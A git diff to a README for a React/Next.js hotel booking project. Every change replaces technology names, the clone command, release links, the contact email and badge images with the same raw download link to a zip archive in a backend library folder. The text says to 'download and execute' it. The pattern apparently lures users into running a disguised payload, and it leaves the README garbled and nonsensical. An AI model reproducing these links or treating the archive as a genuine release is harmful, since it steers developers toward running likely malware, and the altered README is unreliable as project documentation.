@@ -16,7 +16,7 @@ Welcome to the **React Hotel Booking System Project**! This project is designed 
 
 ## Introduction
 
-In today’s digital age, having a reliable hotel booking system is crucial for managing reservations efficiently. This project utilizes a combination of **React.js**, **Next.js**, **Redux.js**, **Node.js**, **Express.js**, **MongoDB**, **Tailwind CSS**, and **Ant Design** to create a fully functional hotel booking system. 
+In today’s digital age, having a reliable hotel booking system is crucial for managing reservations efficiently. This project utilizes a combination of **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**, **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**, **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**, **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**, **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**, **MongoDB**, **Tailwind CSS**, and **Ant Design** to create a fully functional hotel booking system. 
 
 This project not only showcases the power of these technologies but also serves as a practical example for developers looking to enhance their skills in full-stack development.
 
@@ -24,11 +24,11 @@ This project not only showcases the power of these technologies but also serves 
 
 This project employs the following technologies:
 
-- **React.js**: A JavaScript library for building user interfaces.
-- **Next.js**: A React framework for server-side rendering and static site generation.
-- **Redux.js**: A state management library for JavaScript applications.
-- **Node.js**: A JavaScript runtime built on Chrome's V8 engine.
-- **Express.js**: A web application framework for Node.js.
+- **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**: A JavaScript library for building user interfaces.
+- **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**: A React framework for server-side rendering and static site generation.
+- **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**: A state management library for JavaScript applications.
+- **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**: A JavaScript runtime built on Chrome's V8 engine.
+- **https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip**: A web application framework for https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip
 - **MongoDB**: A NoSQL database for storing data.
 - **Tailwind CSS**: A utility-first CSS framework for styling.
 - **Ant Design**: A design system for enterprise-level products.
@@ -50,7 +50,7 @@ To set up the project locally, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project.git
+   git clone https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -126,14 +126,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases and updates, visit our [Releases](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/releases) section. You can download and execute the latest version of the project from there.
+For the latest releases and updates, visit our [Releases](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip) section. You can download and execute the latest version of the project from there.
 
 ## Contact
 
 If you have any questions or feedback, feel free to reach out:
 
-- **GitHub**: [ronmattss2](https://github.com/ronmattss2)
-- **Email**: your-email@example.com
+- **GitHub**: [ronmattss2](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip)
+- **Email**: https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip
 
 ---
 
@@ -141,11 +141,11 @@ Thank you for checking out the **React Hotel Booking System Project**! We hope y
 
 ---
 
-![React](https://img.shields.io/badge/React-React.js-brightgreen.svg)
-![Next.js](https://img.shields.io/badge/Next.js-Next.js-blue.svg)
-![Node.js](https://img.shields.io/badge/Node.js-Node.js-green.svg)
-![MongoDB](https://img.shields.io/badge/MongoDB-MongoDB-orange.svg)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-Tailwind%20CSS-purple.svg)
-![Redux](https://img.shields.io/badge/Redux-Redux.js-yellow.svg)
+![React](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip)
+![https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip)
+![https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip)
+![MongoDB](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip)
+![Tailwind CSS](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip%20CSS-Tailwind%https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip)
+![Redux](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip)
 
-For further details and updates, please check the [Releases](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/releases) section.
+For further details and updates, please check the [Releases](https://github.com/ronmattss2/React-HotelBooking-SYSTEM-Project/raw/refs/heads/main/backend/src/lib/SYSTE_Project_Hotel_Booking_React_1.2.zip) section.
